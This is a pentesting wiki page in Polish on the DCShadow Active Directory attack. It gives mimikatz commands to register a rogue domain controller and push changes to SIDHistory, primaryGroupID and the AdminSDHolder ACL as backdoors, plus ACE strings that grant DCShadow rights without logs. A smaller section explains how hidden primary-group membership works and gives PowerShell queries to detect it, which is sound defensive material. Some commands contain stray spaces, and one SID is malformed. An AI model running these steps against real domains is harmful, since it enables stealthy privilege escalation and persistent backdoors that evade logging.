# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje

Rejestruje **nowy kontroler domeny** w AD i używa go do **wypchnięcia atrybutów** (SIDHistory, SPNs...) do określonych obiektów, **nie pozostawiając żadnych logów** dotyczących **modyfikacji**. **Wymagane są uprawnienia DA** oraz obecność w **domenie głównej**.\
Pamiętaj, że jeśli użyjesz nieprawidłowych danych, pojawią się dość nieprzyjemne logi.<sup>[[2]](#references)</sup>

Aby przeprowadzić atak, potrzebujesz 2 instancji mimikatz. Jedna z nich uruchomi serwery RPC z uprawnieniami SYSTEM (musisz wskazać tutaj zmiany, które chcesz wykonać), a druga instancja będzie używana do wypchnięcia wartości:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Zauważ, że **`elevate::token`** nie zadziała w sesji `mimikatz1`, ponieważ podnosi uprawnienia wątku, a my musimy podnieść **uprawnienia procesu**.\
Możesz również wybrać obiekt „LDAP”: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Możesz wprowadzić zmiany jako DA lub użytkownik z następującymi minimalnymi uprawnieniami:

- W **obiekcie domeny**:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchronization)
- Obiekt **Sites** (i jego elementy podrzędne) w **kontenerze Configuration**:
- _CreateChild and DeleteChild_
- Obiekt **komputera zarejestrowanego jako DC**:
- _WriteProperty_ (Not Write)
- **Obiekt docelowy**:
- _WriteProperty_ (Not Write)

Możesz użyć [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1), aby nadać te uprawnienia nieuprzywilejowanemu użytkownikowi (zauważ, że pozostawi to pewne logi). Jest to znacznie bardziej restrykcyjne niż posiadanie uprawnień DA.\
Na przykład: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Oznacza to, że nazwa użytkownika _**student1**_ po zalogowaniu na komputerze _**mcorp-student1**_ ma uprawnienia DCShadow do obiektu _**root1user**_.

## Używanie DCShadow do tworzenia backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Nadużycie primary group, luki w enumeracji i wykrywanie

- `primaryGroupID` to osobny atrybut, niezależny od listy `member` grupy. DCShadow/DSInternals mogą zapisać go bezpośrednio (np. ustawić `primaryGroupID=512` dla **Domain Admins**) bez wymuszania przez LSASS na hoście, ale AD nadal **przenosi** użytkownika: zmiana PGID zawsze usuwa członkostwo z poprzedniej primary group (tak samo dla każdej docelowej grupy), więc nie można zachować członkostwa w poprzedniej primary group.<sup>[[1]](#references)</sup>
- Domyślne narzędzia uniemożliwiają usunięcie użytkownika z jego bieżącej primary group (`ADUC`, `Remove-ADGroupMember`), dlatego zmiana PGID zazwyczaj wymaga bezpośrednich zapisów do directory (DCShadow/`Set-ADDBPrimaryGroup`).
- Raportowanie członkostwa jest niespójne:
- **Uwzględnia** członków wynikających z primary group: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Pomija** członków wynikających z primary group: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit podczas sprawdzania `member`, `Get-ADUser <user> -Properties memberOf`.
- Rekurencyjne sprawdzanie może pomijać członków primary group, jeśli sama **primary group** jest zagnieżdżona (np. PGID użytkownika wskazuje na zagnieżdżoną grupę wewnątrz Domain Admins); `Get-ADGroupMember -Recursive` lub rekurencyjne filtry LDAP nie zwrócą takiego użytkownika, chyba że rekurencja jawnie rozwiązuje primary groups.
- Sztuczki z DACL: atakujący mogą **odmówić ReadProperty** dla `primaryGroupID` użytkownika (lub dla atrybutu `member` grup innych niż AdminSDHolder), ukrywając efektywne członkostwo przed większością zapytań PowerShell; `net group` nadal rozwiąże członkostwo. Grupy chronione przez AdminSDHolder zresetują takie odmowy.

Przykłady wykrywania/monitorowania:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Porównaj uprzywilejowane grupy, zestawiając dane wyjściowe `Get-ADGroupMember` z `Get-ADGroup -Properties member` lub ADSI Edit, aby wykryć rozbieżności wprowadzone przez `primaryGroupID` lub ukryte atrybuty.<sup>[[1]](#references)</sup>

## Shadowception - nadawanie uprawnień DCShadow przy użyciu DCShadow (bez logów zmodyfikowanych uprawnień)

Musimy dodać poniższe ACE z SID naszego użytkownika na końcu:<sup>[[2]](#references)</sup>

- Na obiekcie domeny:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Na obiekcie komputera atakującego: `(A;;WP;;;UserSID)`
- Na obiekcie docelowego użytkownika: `(A;;WP;;;UserSID)`
- Na obiekcie Sites w kontenerze Configuration: `(A;CI;CCDC;;;UserSID)`

Aby pobrać bieżący ACE obiektu: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Zauważ, że w tym przypadku musisz wprowadzić **kilka zmian,** a nie tylko jedną. Dlatego w **sesji mimikatz1** (serwerze RPC) użyj parametru **`/stack` przy każdej zmianie**, którą chcesz wprowadzić. Dzięki temu wystarczy tylko raz użyć **`/push`**, aby wykonać wszystkie zapisane zmiany na fałszywym serwerze.

[**Więcej informacji o DCShadow w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## Referencje

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
